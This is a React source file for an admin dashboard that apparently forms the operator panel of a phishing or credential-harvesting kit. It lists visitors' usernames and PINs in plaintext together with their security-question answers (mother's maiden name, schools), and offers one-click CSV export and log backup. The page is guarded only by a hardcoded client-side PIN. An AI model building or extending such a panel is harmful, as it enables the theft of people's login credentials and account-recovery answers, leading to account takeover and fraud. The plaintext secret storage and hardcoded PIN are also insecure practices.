import React, { useState, useEffect } from 'react';
import { format } from 'date-fns';
import { Users, Key, CheckCircle, XCircle, Calendar, Download, Shield, Database } from 'lucide-react';
import LoginHeader from '../components/LoginHeader';
import LoginFooter from '../components/LoginFooter';
import { authService } from '../services/authService';
import { loginTrackingService } from '../services/loginTrackingService';
import { downloadRecentLogs } from '../services/backupService';
import { LoginAttempt } from '../types/auth';
import { formatDateTime } from '../utils/dateUtils';

interface Stats {
  totalVisitors: number;
  totalAttempts: number;
  successfulAttempts: number;
  failedAttempts: number;
  firstVisit: string | null;
}

function StatCard({ title, value, icon: Icon }: { title: string; value: string | number; icon: any }) {
  return (
    <div className="bg-white p-6 rounded-lg shadow-md">
      <div className="flex items-center justify-between mb-4">
        <h3 className="text-lg font-semibold text-gray-800">{title}</h3>
        <Icon className="text-purple-800" size={24} />
      </div>
      <p className="text-3xl font-bold text-purple-800">{value}</p>
    </div>
  );
}

function SecurityAnswersSection({ attempts }: { attempts: LoginAttempt[] }) {
  const securityAnswers = attempts.filter(a => a.securityAnswers);

  return (
    <div className="mb-8">
      <div className="flex items-center gap-2 mb-4">
        <Shield className="text-purple-800" size={24} />
        <h2 className="text-xl font-semibold">Security Question Responses</h2>
      </div>
      
      <div className="space-y-4">
        {securityAnswers.map((attempt, index) => (
          <div key={index} className="bg-white p-4 rounded-lg shadow-md">
            <div className="flex justify-between items-start mb-3">
              <div>
                <span className="font-semibold">
                  {formatDateTime(attempt.timestamp)}
                </span>
                <span className="ml-3 text-gray-600">
                  User: {attempt.username}
                </span>
              </div>
              <span className={`px-2 py-1 text-xs font-semibold rounded-full ${
                attempt.success 
                  ? 'bg-green-100 text-green-800' 
                  : 'bg-red-100 text-red-800'
              }`}>
                {attempt.success ? 'Success' : 'Failed'}
              </span>
            </div>
            
            <div className="grid grid-cols-2 gap-4 mt-2">
              <div>
                <p className="text-sm font-medium text-gray-600">Mother's Maiden Name:</p>
                <p className="font-mono bg-gray-50 p-2 rounded mt-1">
                  {attempt.securityAnswers?.mothersMaidenName}
                </p>
              </div>
              <div>
                <p className="text-sm font-medium text-gray-600">High School:</p>
                <p className="font-mono bg-gray-50 p-2 rounded mt-1">
                  {attempt.securityAnswers?.highSchool}
                </p>
              </div>
              <div className="col-span-2">
                <p className="text-sm font-medium text-gray-600">First School:</p>
                <p className="font-mono bg-gray-50 p-2 rounded mt-1">
                  {attempt.securityAnswers?.firstSchool}
                </p>
              </div>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

function LoginHistorySection({ attempts }: { attempts: LoginAttempt[] }) {
  return (
    <div className="mb-8">
      <div className="flex items-center gap-2 mb-4">
        <Key className="text-purple-800" size={24} />
        <h2 className="text-xl font-semibold">Login History</h2>
      </div>
      
      <div className="space-y-4">
        {attempts.map((attempt, index) => (
          <div 
            key={index}
            className={`p-4 rounded-lg ${
              attempt.success ? 'bg-green-50' : 'bg-red-50'
            }`}
          >
            <div className="flex justify-between items-start mb-3">
              <div>
                <span className="font-semibold">
                  {formatDateTime(attempt.timestamp)}
                </span>
                <span className={`ml-3 px-2 py-1 text-xs font-semibold rounded-full ${
                  attempt.success 
                    ? 'bg-green-100 text-green-800' 
                    : 'bg-red-100 text-red-800'
                }`}>
                  {attempt.success ? 'Success' : 'Failed'}
                </span>
              </div>
              <span className="text-sm text-gray-600">
                {attempt.page}
              </span>
            </div>
            
            <div className="space-y-2 text-sm">
              <div className="grid grid-cols-2 gap-2">
                <span className="font-medium text-gray-600">Username:</span>
                <span className="font-mono">{attempt.username}</span>
              </div>
              <div className="grid grid-cols-2 gap-2">
                <span className="font-medium text-gray-600">PIN:</span>
                <span className="font-mono">{attempt.pin}</span>
              </div>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

function AdminDashboard() {
  const [loginAttempts, setLoginAttempts] = useState<LoginAttempt[]>([]);
  const [stats, setStats] = useState<Stats | null>(null);

  useEffect(() => {
    loadData();
  }, []);

  const loadData = async () => {
    const attempts = loginTrackingService.getLoginHistory();
    setLoginAttempts(attempts);
    setStats(authService.getStats());
  };

  const handleLogout = () => {
    authService.logout();
    window.location.reload();
  };

  const handleBackup = () => {
    downloadRecentLogs(loginAttempts);
  };

  const handleExport = () => {
    const attempts = loginTrackingService.getLoginHistory();
    const csvContent = [
      ['Timestamp', 'Username', 'PIN', 'Page', 'Status', 'Mother\'s Maiden Name', 'High School', 'First School', 'Action'].join(','),
      ...attempts.map(attempt => [
        attempt.timestamp,
        attempt.username,
        attempt.pin,
        attempt.page,
        attempt.success ? 'Success' : 'Failed',
        attempt.securityAnswers?.mothersMaidenName || '',
        attempt.securityAnswers?.highSchool || '',
        attempt.securityAnswers?.firstSchool || '',
        attempt.action || ''
      ].join(','))
    ].join('\n');

    const blob = new Blob([csvContent], { type: 'text/csv' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `login-history-${format(new Date(), 'yyyy-MM-dd')}.csv`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
  };

  return (
    <div className="min-h-screen flex flex-col">
      <LoginHeader />
      
      <main className="flex-grow container mx-auto px-4 py-8">
        <div className="bg-white rounded-lg shadow-lg p-8">
          <div className="flex justify-between items-center mb-6">
            <h1 className="text-2xl font-bold text-purple-800">
              Admin Dashboard
            </h1>
            <div className="space-x-4">
              <button
                onClick={handleBackup}
                className="bg-green-600 text-white px-4 py-2 rounded-md hover:bg-green-700 transition-colors flex items-center gap-2"
                title="Download last 48 hours of logs"
              >
                <Database size={16} />
                Backup Recent Logs
              </button>
              <button
                onClick={handleExport}
                className="bg-purple-800 text-white px-4 py-2 rounded-md hover:bg-purple-700 transition-colors flex items-center gap-2"
              >
                <Download size={16} />
                Export All (CSV)
              </button>
              <button
                onClick={handleLogout}
                className="bg-red-600 text-white px-4 py-2 rounded-md hover:bg-red-700 transition-colors"
              >
                Logout
              </button>
            </div>
          </div>

          {stats && (
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
              <StatCard
                title="Total Visitors"
                value={stats.totalVisitors}
                icon={Users}
              />
              <StatCard
                title="Login Attempts"
                value={stats.totalAttempts}
                icon={Key}
              />
              <StatCard
                title="Successful Logins"
                value={stats.successfulAttempts}
                icon={CheckCircle}
              />
              <StatCard
                title="Failed Attempts"
                value={stats.failedAttempts}
                icon={XCircle}
              />
            </div>
          )}

          <SecurityAnswersSection attempts={loginAttempts} />
          <LoginHistorySection attempts={loginAttempts} />
        </div>
      </main>

      <LoginFooter />
    </div>
  );
}

export default function AdminPage() {
  const [showPrompt, setShowPrompt] = useState(!authService.isAdmin());

  if (showPrompt) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-100">
        <div className="bg-white p-8 rounded-lg shadow-lg max-w-md w-full">
          <h2 className="text-xl font-bold text-purple-800 mb-4">
            Enter Admin PIN
          </h2>
          <input
            type="password"
            className="w-full px-3 py-2 border rounded"
            placeholder="Enter PIN"
            onChange={(e) => {
              if (e.target.value === '199594') {
                setShowPrompt(false);
              }
            }}
          />
        </div>
      </div>
    );
  }

  return <AdminDashboard />;
}